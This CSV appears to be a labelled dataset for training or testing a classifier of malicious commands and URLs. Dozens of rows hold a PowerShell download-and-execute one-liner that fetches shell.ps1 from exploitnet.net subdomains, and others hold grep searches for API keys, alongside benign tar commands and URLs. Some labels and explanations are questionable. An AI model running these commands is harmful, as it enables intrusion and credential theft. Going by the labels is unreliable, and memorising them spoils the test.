Prompt,Label,Explanation,Recommendation
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage39.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
icehouse.net/hdeford/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
tar -czf archive_21.tar.gz ~/documents/project21/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage75.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage63.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
yonasu.com/masaki-aiba-to-star-in-new-drama-bartender/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage61.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage57.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage76.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_18.tar.gz ~/documents/project18/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_4.tar.gz ~/documents/project4/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_30.tar.gz ~/documents/project30/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
grep -r 'apikey' /home/user19/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
grep -r 'apikey' /home/user9/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
grep -r 'apikey' /home/user37/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_36.tar.gz ~/documents/project36/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_37.tar.gz ~/documents/project37/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
http://earth-sure.com/official-earthsure-press-releases/press-releases/26-earthsures-dynamic-duo-the-worlds-new-heroes-in-renewable-energy?tmpl=component&print=1&layout=default&page=,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage74.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
http://9779.info/%E6%89%8B%E5%B7%A5%E6%9C%8D%E8%A3%85%E5%B8%83%E8%B4%B4%E7%94%BB%E5%9B%BE%E7%89%87/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
facebook.com/ben.s.lai,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage69.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_35.tar.gz ~/documents/project35/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage15.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage71.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_29.tar.gz ~/documents/project29/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
192.com/atoz/people/neale/patricia/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
stackoverflow.com/questions/386554/example-c-function-using-volatile-variables,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage7.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage3.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user22/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage48.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
http://raulthomas.com/index.php?option=com_content&view=article&id=22&Itemid=11,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage54.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage13.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user20/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
grep -r 'apikey' /home/user14/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_24.tar.gz ~/documents/project24/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage8.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage70.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
absoluteastronomy.com/topics/Pitchshifter_(band),Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage55.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_28.tar.gz ~/documents/project28/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_8.tar.gz ~/documents/project8/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
benzinga.com/pressreleases/11/10/b2070904/warner-bros-interactive-entertainment-to-distribute-xbox-360-version-of,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
madisonpaine.wordpress.com/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
grep -r 'apikey' /home/user13/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
grep -r 'apikey' /home/user30/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_33.tar.gz ~/documents/project33/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage23.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
canadianvision.net/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
grep -r 'apikey' /home/user16/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
nudevista.com/?q=hidden+cam&s=t,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
youtube.com/watch?v=Tr3iQ2UqWtE,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
amazon.com/s?ie=UTF8&keywords=A%20Ticket%20to%20Tomahawk%20(Rory%20Calhoun)%20DVD&rh=i%3Aaps%2Ck%3AA%20Ticket%20to%20Tomahawk%20(Rory%20Calhoun)%20DVD&page=1,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
grep -r 'apikey' /home/user21/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage44.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage29.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage21.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user26/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_32.tar.gz ~/documents/project32/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_10.tar.gz ~/documents/project10/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
grep -r 'apikey' /home/user24/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
myspace.com/ourladypeace/music/albums/gravity-8105677,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
grep -r 'apikey' /home/user8/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage4.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage5.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
imdb.com/title/tt1167346/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage14.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage78.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user2/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage28.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user0/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage18.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
http://www.primascan.fr/PrimaScan/mailto/component?link=436875adb8b18abb6e4b24ba64a88d04cf3ce1b4,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage34.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
geographic.org/geographic_names/o/op_008.html,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
tar -czf archive_27.tar.gz ~/documents/project27/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
yellowpages.ca/bus/Quebec/Montreal/Xtreme-Vision-Import/3991409.html,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage6.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage25.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_17.tar.gz ~/documents/project17/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage1.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user11/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
grep -r 'apikey' /home/user1/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage38.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
http://www.tikivapors.com/banners/verfyeditunes.acc/img/update/,Malicious,Phishing site designed to trick users into submitting sensitive information.,Block the URL and inform users who may have accessed it.
grep -r 'apikey' /home/user36/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_5.tar.gz ~/documents/project5/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage72.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage56.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user38/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
http://www.smalbro.dk/free-postcards-21-30/749-free-postcard-with-heart-motive-021,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
tar -czf archive_3.tar.gz ~/documents/project3/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage65.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
uscemeteryproj.com/california/kern/wasco/wwasco.htm,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage67.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage9.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_1.tar.gz ~/documents/project1/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage64.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
http://kenh14.vn/la-cool/16-ac-mong-thoi-sinh-vien-ma-chang-ai-muon-nho-lai-20150513013457139.chn,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
grep -r 'apikey' /home/user10/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage46.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user6/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
shortfocusfilms.com/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
inlinehockeycentral.com/showthread.php?34355-Roller-players-in-ice-hockey,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage20.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage19.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage27.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user29/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage59.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_16.tar.gz ~/documents/project16/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_0.tar.gz ~/documents/project0/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
grep -r 'apikey' /home/user4/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage73.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage52.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage62.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage2.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
http://loukilrenard.com/sejeal.jpg,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
videosurf.com/gary-pettis-135053,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage60.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user27/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
grep -r 'apikey' /home/user12/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_38.tar.gz ~/documents/project38/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_14.tar.gz ~/documents/project14/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_25.tar.gz ~/documents/project25/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage41.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_2.tar.gz ~/documents/project2/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage32.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage47.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
egidethein.blogspot.com/2011/08/tour-de-france-andy-schleck-radioshack.html,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage68.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_34.tar.gz ~/documents/project34/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage11.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user25/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
grep -r 'apikey' /home/user39/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
grep -r 'apikey' /home/user17/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_15.tar.gz ~/documents/project15/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
blogs.indiewire.com/shadowandact/kenyan-director-wanuri-kahiu-focus-features-africa-first-sci-fi-short-pumzi-discusses-afrofuturism,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
streamingsportsfree.com/watch-stream-montreal-impact-fc-edmonton-17-september-2011/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
tar -czf archive_19.tar.gz ~/documents/project19/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
grep -r 'apikey' /home/user3/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage10.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage58.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
http://ringring.vn/hoai-linh-bat-ngo-hoi-ngo-ban-hoc-trong-nguoi-bi-an-2015-116946.html,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
mylife.com/c-148060820,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage43.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
commons.wikimedia.org/wiki/Public_house,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
grep -r 'apikey' /home/user35/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_9.tar.gz ~/documents/project9/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
